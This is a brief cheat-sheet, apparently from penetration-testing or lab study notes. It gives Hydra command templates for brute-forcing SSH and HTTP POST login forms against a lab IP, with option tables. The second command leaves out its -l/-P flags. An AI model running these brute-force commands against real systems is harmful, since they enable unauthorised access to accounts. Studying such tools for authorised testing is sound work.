
# Hydra
Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

SSH
hydra -l <username> -P <full path to pass> 10.129.142.238 -t 4 ssh

Option	Description
-l	specifies the (SSH) username for login
-P	indicates a list of passwords
-t	sets the number of threads to spawn
sudo hydra <username> <wordlist> 10.129.142.238 http-post-form "<path>:<login_credentials>:<invalid_response>"

Option	Description
-l	the username for (web form) login
-P	the password list to use
http-post-form	The type of the form is POST
<path>	the login page URL, for example, login.php
<login_credentials>	the username and password used to log in, for example, username=^USER^&password=^PASS^
<invalid_response>	part of the response when the login fails
-V	verbose output for every attempt
